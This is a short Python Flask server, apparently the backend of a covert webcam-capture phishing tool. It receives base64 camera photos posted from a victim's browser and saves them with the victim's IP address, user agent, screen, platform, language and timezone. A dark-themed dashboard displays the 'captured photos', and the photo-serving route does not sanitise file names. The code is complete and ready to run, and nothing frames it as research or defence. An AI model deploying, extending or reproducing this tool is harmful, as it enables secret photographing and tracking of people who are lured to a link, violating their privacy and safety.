import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

if not os.path.exists('fotos'):
    os.makedirs('fotos')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        
        if data and 'image' in data:
            img_data = data['image'].split(',')[1]
            img_bytes = base64.b64decode(img_data)
            
            filename = f"fotos/{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}.jpg"
            
            with open(filename, 'wb') as f:
                f.write(img_bytes)
            
            info = {
                'ip': request.remote_addr,
                'user_agent': data.get('userAgent', 'N/A'),
                'screen': data.get('screen', 'N/A'),
                'platform': data.get('platform', 'N/A'),
                'language': data.get('language', 'N/A'),
                'timezone': data.get('timezone', 'N/A'),
                'timestamp': data.get('timestamp', 'N/A')
            }
            
            with open(f"fotos/{datetime.now().strftime('%Y%m%d_%H%M%S')}_info.json", 'w') as f:
                json.dump(info, f, indent=2)
            
            print(f"\n[+] FOTO RECEBIDA! IP: {request.remote_addr}")
            
            return jsonify({'status': 'ok'}), 200
        else:
            return jsonify({'status': 'erro', 'mensagem': 'Sem imagem'}), 400
            
    except Exception as e:
        print(f"[-] Erro: {e}")
        return jsonify({'status': 'erro'}), 500

@app.route('/fotos', methods=['GET'])
def listar_fotos():
    html = """
    <html>
    <head><title>Fotos Capturadas</title>
    <style>
        body { font-family: Arial; margin: 20px; background: #0f0f0f; color: white; }
        h1 { color: #00ff88; }
        .foto { display: inline-block; margin: 10px; padding: 10px; background: #1a1a1a; border-radius: 8px; border: 1px solid #333; }
        img { max-width: 300px; border-radius: 4px; }
        .info { font-size: 12px; color: #888; margin-top: 5px; }
    </style>
    </head>
    <body>
    <h1>📸 Fotos Capturadas</h1>
    """
    
    if os.path.exists('fotos'):
        fotos = [f for f in os.listdir('fotos') if f.endswith('.jpg')]
        fotos.sort(reverse=True)
        
        if not fotos:
            html += "<p>Nenhuma foto capturada ainda.</p>"
        else:
            for foto in fotos[:50]:
                html += f'<div class="foto">'
                html += f'<img src="/foto/{foto}">'
                html += f'<div class="info">{foto}</div>'
                html += '</div>'
    
    html += "</body></html>"
    return html

@app.route('/foto/<nome>')
def servir_foto(nome):
    caminho = os.path.join('fotos', nome)
    if os.path.exists(caminho):
        return send_file(caminho, mimetype='image/jpeg')
    return 'Foto não encontrada', 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
